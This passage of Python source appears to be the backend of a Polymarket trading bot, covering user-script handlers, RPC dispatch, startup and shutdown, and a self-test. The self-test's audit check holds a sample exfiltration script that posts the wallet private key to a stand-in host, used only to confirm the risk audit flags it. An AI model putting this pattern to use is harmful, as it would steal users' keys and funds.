        code_changed = bool(existing) and str(existing.get("code") or "") != code
        force_off = (code_changed and bool(existing.get("enabled"))
                     and not audit["ok"])
        db.upsert_user_script(conn, {
            "id": sid, "name": name, "description": desc, "code": code,
            "notes": str(p.get("notes") or ""),
        })
        if errors:
            db.update_user_script(conn, sid, enabled=0,
                                  last_error="; ".join(errors[:3])[:500])
        elif force_off:
            db.update_user_script(
                conn, sid, enabled=0,
                last_error=f"Code changed and the risk audit flagged "
                           f"{audit['critical']} critical issue(s) — disabled "
                           "pending your review. Read the Risk tab, then "
                           "re-enable.")
        else:
            db.update_user_script(conn, sid, last_error=None)
        row = db.get_user_script(conn, sid)
    return {"script": _script_row_js(row or {}), "errors": errors,
            "warnings": _script_warnings(code), "audit": audit,
            "disarmed": force_off}


def _script_warnings(code: str) -> list[str]:
    import replay
    missing = sorted(set(script_sandbox.find_ctx_fields(code)) - replay._DERIVABLE)
    warnings = []
    if missing:
        warnings.append(
            "Reads ctx fields that are LIVE-ONLY (None during backtests): "
            + ", ".join(missing))
    return warnings


async def _h_script_delete(p: dict) -> dict:
    sid = str(p.get("id") or "")
    with db.get_db() as conn:
        db.delete_user_script(conn, sid)
    try:
        import script_engine
        script_engine.forget(sid)
    except Exception:
        pass
    return {"ok": True}


async def _h_script_set_enabled(p: dict) -> dict:
    sid = str(p.get("id") or "")
    enabled = bool(p.get("enabled"))
    with db.get_db() as conn:
        row = db.get_user_script(conn, sid)
        if not row:
            raise ValueError("script not found")
        if enabled:
            errors = script_sandbox.validate(str(row.get("code") or ""))
            if errors:
                raise ValueError("script does not validate: " + errors[0])
            db.update_user_script(conn, sid, enabled=1, last_error=None)
        else:
            db.update_user_script(conn, sid, enabled=0)
        row = db.get_user_script(conn, sid)
    return {"script": _script_row_js(row or {})}


async def _h_script_set_assets(p: dict) -> dict:
    import script_backtest
    sid = str(p.get("id") or "")
    scope = script_backtest.parse_asset_scope(p.get("assets"))
    with db.get_db() as conn:
        row = db.get_user_script(conn, sid)
        if not row:
            raise ValueError("script not found")
        db.update_user_script(
            conn, sid, assets=json.dumps(scope) if scope else None)
        row = db.get_user_script(conn, sid)
    return {"script": _script_row_js(row or {})}


async def _h_script_validate(p: dict) -> dict:
    import script_audit
    code = _sanitize_script_code(p.get("code"))
    errors = script_sandbox.validate(code)
    meta = script_sandbox.parse_header(code)
    return {
        "ok": not errors, "errors": errors,
        "warnings": _script_warnings(code),
        "audit": script_audit.audit(code),
        "name": meta.get("name") or "", "description": meta.get("description") or "",
        "hasHeader": bool(meta.get("version")),
        "ctxFields": script_sandbox.find_ctx_fields(code),
    }


async def _h_script_backtest(p: dict) -> dict:
    import script_backtest
    cfg = dict(STATE.cfg or {})
    patch = (p or {}).get("config") or {}
    if isinstance(patch, dict):
        cfg.update(patch)
    cfg = merge_with_defaults(cfg)
    since = int((p or {}).get("sinceDays") or 60)
    env = str((p or {}).get("env") or polymarket_auth.get_env())
    code = _sanitize_script_code(p.get("code"))
    assets = (p or {}).get("assets")
    if not code:
        with db.get_db() as conn:
            row = db.get_user_script(conn, str(p.get("id") or ""))
        if not row:
            raise ValueError("script not found")
        code = _sanitize_script_code(row.get("code"))
        if assets is None:
            assets = row.get("assets")
    return await asyncio.to_thread(
        script_backtest.run, cfg, str(code),
        assets=assets, env=env, since_days=since,
    )


async def _h_script_context_pack(_p: dict) -> dict:
    import script_docs
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    env = polymarket_auth.get_env()
    text = await asyncio.to_thread(script_docs.build_context_pack, cfg, env)
    return {"text": text}


async def _h_script_api_docs(_p: dict) -> dict:
    import replay
    import script_docs
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    return {
        "contract": script_docs.CONTRACT_DOC,
        "fields": [
            {"name": n, "doc": d, "backtestable": n in replay._DERIVABLE}
            for n, d in script_docs.FIELD_DOCS.items()
        ],
        "injected": list(script_sandbox.INJECTED_GLOBALS),
        "hookTimeoutSec": float(cfg.get("script_hook_timeout_sec") or 1.0),
        "rails": {
            "maxEntryCents": int(cfg.get("script_max_entry_cents") or 97),
            "maxContracts": int(cfg.get("script_max_contracts") or 20),
            "maxOpen": int(cfg.get("script_max_open") or 2),
            "dailyLossUsd": float(cfg.get("script_daily_loss_usd") or 25.0),
            "defaultOrderSize": int(cfg.get("crypto15m_order_size") or 1),
        },
        "examples": [
            {"name": "Late Favorite Follow", "code": script_docs.EXAMPLE_SIMPLE},
            {"name": "Momentum Confirm (stateful)", "code": script_docs.EXAMPLE_STATEFUL},
            {"name": "Trailing Exit (manage hook)", "code": script_docs.EXAMPLE_MANAGE},
            {"name": "Night Shift (supervisor)", "code": script_docs.EXAMPLE_SUPERVISOR},
        ],
    }


async def _h_polymarketUrl(p: dict) -> dict:
    url = await polymarket_api.web_market_url(
        event_ticker=str(p.get("eventTicker") or ""),
        ticker=str(p.get("ticker") or ""),
        env=str(p.get("env") or "mainnet"),
    )
    return {"url": url}


_HANDLERS = {
    "ping": _h_ping,
    "crypto15m": _h_crypto15m,
    "crypto15mStatus": _h_crypto15mStatus,
    "tradingStatus": _h_trading_status,
    "c15History": _h_c15_history,
    "c15Backtest": _h_c15_backtest,
    "c15ParlayGenerate": _h_c15_parlay_generate,
    "c15ParlayStatus": _h_c15_parlay_status,
    "c15ParlayArm": _h_c15_parlay_arm,
    "mainBacktest": _h_main_backtest,
    "collectionStats": _h_collection_stats,
    "exportResearch": _h_export_research,
    "scriptsList": _h_scripts_list,
    "scriptSave": _h_script_save,
    "scriptDelete": _h_script_delete,
    "scriptSetEnabled": _h_script_set_enabled,
    "scriptSetAssets": _h_script_set_assets,
    "scriptSetDryRun": _h_script_set_dry_run,
    "scriptShadowOrders": _h_script_shadow_orders,
    "scriptValidate": _h_script_validate,
    "scriptBacktest": _h_script_backtest,
    "scriptContextPack": _h_script_context_pack,
    "scriptApiDocs": _h_script_api_docs,
    "copyStatus": _h_copyStatus,
    "polymarketUrl": _h_polymarketUrl,
    "setConfig": _h_setConfig,
    "setCredentials": _h_setCredentials,
    "clearCredentials": _h_clearCredentials,
    "credentialStatus": _h_credentialStatus,
    "testCredentials": _h_testCredentials,
    "account": _h_account,
    "pnlSeries": _h_pnlSeries,
    "positions": _h_positions,
    "signals": _h_signals,
    "scannerStats": _h_scannerStats,
    "cancelAllOpen": _h_cancelAllOpen,
    "flatten": _h_flatten,
    "runOnce": _h_runOnce,
    "pause": _h_pause,
    "shutdown": _h_shutdown,
    "botRuns": _h_botRuns,
    "factoryReset": _h_factoryReset,
    "clearHistory": _h_clearHistory,
}


async def _dispatch_request(req: dict) -> None:
    rid = req.get("id", "")
    method = req.get("method", "")
    params = req.get("params") or {}
    h = _HANDLERS.get(method)
    if not h:
        await respond_err(rid, f"unknown method: {method}")
        return
    try:
        result = await h(params)
        await respond_ok(rid, result)
    except Exception as e:
        logger.debug(
            f"RPC {method} failed: {e}\n{traceback.format_exc(limit=3)}"
        )
        await respond_err(rid, f"{type(e).__name__}: {e}")


async def _stdin_reader() -> None:
    loop = asyncio.get_event_loop()

    def _readline() -> str:
        return sys.stdin.readline()

    while True:
        line = await loop.run_in_executor(None, _readline)
        if not line:
            await asyncio.sleep(0.1)
            await _shutdown()
            return
        line = line.strip()
        if not line:
            continue
        try:
            req = json.loads(line)
        except Exception:
            continue
        if not isinstance(req, dict):
            continue
        if req.get("type") != "rpc":
            continue
        t = asyncio.create_task(_dispatch_request(req))
        _bg_tasks.add(t)
        t.add_done_callback(_bg_tasks.discard)


_shutting_down = False


async def _shutdown() -> None:
    global _shutting_down
    if _shutting_down:
        return
    _shutting_down = True
    try:
        await _stop_loop()
    except Exception:
        pass
    try:
        if STATE.auth_ok:
            n = await trader.cancel_all_resting_orders("shutdown")
            if n:
                logger.info(f"Shutdown: canceled {n} resting order(s)")
    except Exception as e:
        logger.warning(f"shutdown cancel-resting failed: {e}")
    try:
        await spot_ws.stop()
    except Exception:
        pass
    try:
        await rtds_ws.stop()
    except Exception:
        pass
    try:
        if STATE.active_run_id:
            with db.get_db() as conn:
                db.end_bot_run(conn, STATE.active_run_id)
            STATE.active_run_id = 0
    except Exception:
        pass
    try:
        await polymarket_api.close_clients()
    except Exception:
        pass
    try:
        await crypto15m.close_clients()
    except Exception:
        pass
    try:
        import clob_ws
        await clob_ws.feed.stop()
    except Exception:
        pass
    try:
        import instance_lock
        for env_name in ("mainnet", "testnet"):
            try:
                addr = polymarket_auth.trading_address(env_name)
                if addr:
                    instance_lock.release(addr)
            except Exception:
                pass
    except Exception:
        pass
    await emit_event("backend:shutdown", {})
    sys.stdout.flush()
    await asyncio.sleep(0.1)
    os._exit(0)


async def _main() -> None:
    sys.stdout = io.TextIOWrapper(
        sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True
    )
    STATE.started_at = datetime.now(timezone.utc).isoformat()
    db.init_db()
    crypto15m_trader.set_auto_off_callback(_on_crypto15m_auto_off)
    script_engine.set_event_callback(emit_event)
    logger.info("ROM PolyBot backend starting")

    stdin_task = asyncio.create_task(_stdin_reader(), name="stdin_reader")

    active_env = STATE.cfg.get("network", "mainnet")
    try:
        polymarket_auth.set_env(active_env)
    except Exception:
        pass
    try:
        if polymarket_auth.migrate_legacy_credentials(active_env):
            logger.info(f"Migrated legacy credentials → {active_env}")
    except Exception as e:
        logger.warning(f"legacy credential migration failed: {e}")

    if polymarket_auth.credentials_present(active_env):
        STATE.auth_ok = await _establish_auth()
        if STATE.auth_ok:
            logger.info("Saved credentials verified")

    await emit_event("backend:ready", {"startedAt": STATE.started_at})
    await emit_event("backend:authChanged", {"authOk": STATE.auth_ok})
    try:
        await emit_event(
            "credentials:changed", polymarket_auth.credentials_status_all(),
        )
    except Exception:
        pass

    if STATE.auth_ok:
        try:
            n = await trader.cancel_all_resting_orders("startup stale-order sweep")
            if n:
                logger.info(f"Startup: canceled {n} stale resting order(s)")
        except Exception as e:
            logger.warning(f"startup cancel-resting failed: {e}")

    if STATE.auth_ok:
        try:
            summary, changed = await trader.reconcile_positions_with_polymarket()
            if any(summary.values()):
                logger.info(f"Eager startup reconcile: {summary}")
            await emit_event("backend:reconciled", summary)
            for row in changed:
                await emit_event("position:update", _position_row_to_js(row))
        except Exception as e:
            logger.warning(f"eager startup reconcile failed: {e}")

    if STATE.auth_ok:
        try:
            cents, port = await trader.refresh_balance(STATE.cfg, force=True)
            env_now = polymarket_auth.get_env()
            with db.get_db() as conn:
                stats = db.aggregate_stats(conn, env_now)
                STATE.active_run_id = db.start_bot_run(
                    conn,
                    env=env_now,
                    cash_usd=cents / 100.0,
                    portfolio_usd=port / 100.0,
                    lifetime_trades=int(stats.get("total_opened") or 0),
                    lifetime_wins=int(stats.get("wins") or 0),
                    lifetime_losses=int(stats.get("losses") or 0),
                )
            logger.info(
                f"Bot run #{STATE.active_run_id} started "
                f"(env={env_now}, "
                f"start_total=${(cents + port) / 100.0:.2f})"
            )
        except Exception as e:
            logger.warning(f"could not open bot_run: {e}")

    await _start_loop()
    try:
        await stdin_task
    except Exception as e:
        logger.error(f"reader crashed: {e}")
    finally:
        await _shutdown()


def _selftest() -> int:
    checks: list[tuple[str, bool, str]] = []

    def _try(name: str, fn) -> None:
        try:
            fn()
            checks.append((name, True, ""))
        except Exception as e:  # noqa: BLE001 — report every failure mode
            checks.append((name, False, f"{type(e).__name__}: {e}"))

    _try("import httpx", lambda: __import__("httpx"))
    _try("import cryptography", lambda: __import__("cryptography"))
    _try("Ed25519 signing", lambda: __import__("cryptography.hazmat.primitives.asymmetric.ed25519", fromlist=["Ed25519PrivateKey"]).Ed25519PrivateKey.generate().sign(b"ROM selftest"))
    _try("import websockets (CLOB WS feed)", lambda: __import__("websockets"))
    _try("import US market stream", lambda: __import__("us_market_stream"))
    _try("import indicators + compute", lambda: __import__("indicators").compute([1.0, 2.0]))
    _try("import spot_ws (Coinbase spot feed)", lambda: __import__("spot_ws"))
    _try("import rtds_ws (RTDS Chainlink feed)", lambda: __import__("rtds_ws"))
    _try("import activity_ws (RTDS trade tape)", lambda: __import__("activity_ws"))
    _try("import replay (backtest engine)", lambda: __import__("replay"))
    _try("import parlay_generator", lambda: __import__("parlay_generator"))
    _try("model math (settlement sniper)", lambda: (
        __import__("crypto15m").model_up_prob(101.0, 100.0, 0.001, 5.0)))

    def _script_runtime_check() -> None:
        ss = __import__("script_sandbox")
        good = ("def decide(ctx):\n"
                "    return {\"side\": \"up\", \"price\": \"ask\"}\n")
        mod = ss.CompiledScript("selftest", good)
        intent = mod.call("decide", {"minsLeft": 1.0})
        assert intent and intent.get("side") == "up", "decide() lost its intent"
        assert not ss.validate("import os\ndef decide(ctx):\n    return None"), \
            "validator rejected an import (scripts are unsandboxed now)"
        assert ss.validate("def nope(ctx):\n    return None\n"), \
            "validator accepted a script with no entry hook"
        try:
            bad = ss.CompiledScript(
                "selftest2",
                "def decide(ctx):\n"
                "    while True:\n        pass\n", traced=True)
            bad.call("decide", {}, budget_ms=50.0)
            raise AssertionError("budget did not kill a busy loop")
        except ss.ScriptBudgetExceeded:
            pass

    def _audit_check() -> None:
        sa = __import__("script_audit")
        clean = sa.audit(
            "def decide(ctx):\n    return None\n")
        assert clean["ok"] and not clean["findings"], \
            "audit flagged a plain strategy"
        evil = sa.audit(
            "import requests\n"
            "import polymarket_auth\n"
            "def decide(ctx):\n"
            "    requests.post('https://x.example', json=polymarket_auth.private_key)\n"
            "    return None\n")
        assert not evil["ok"] and evil["critical"] >= 3, \
            f"audit missed an exfiltration script: {evil}"
        assert "exfiltration" in evil["categories"], \
            "audit missed the wallet+network combination rule"

    _try("user scripts (compile / run / runaway guard)", _script_runtime_check)
    _try("script risk audit", _audit_check)
    _try("import script_backtest", lambda: __import__("script_backtest"))
    _try("import script_engine", lambda: __import__("script_engine"))
    _try("import script_audit", lambda: __import__("script_audit"))
    _try("import script_docs", lambda: __import__("script_docs"))

    ok = all(c[1] for c in checks)
    print("=== rom-polybot backend selftest ===")
    for name, passed, err in checks:
        print(f"  [{'OK  ' if passed else 'FAIL'}] {name}{('  -> ' + err) if err else ''}")
    print("RESULT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        sys.exit(_selftest())
    try:
        asyncio.run(_main())
    except KeyboardInterrupt:
        pass
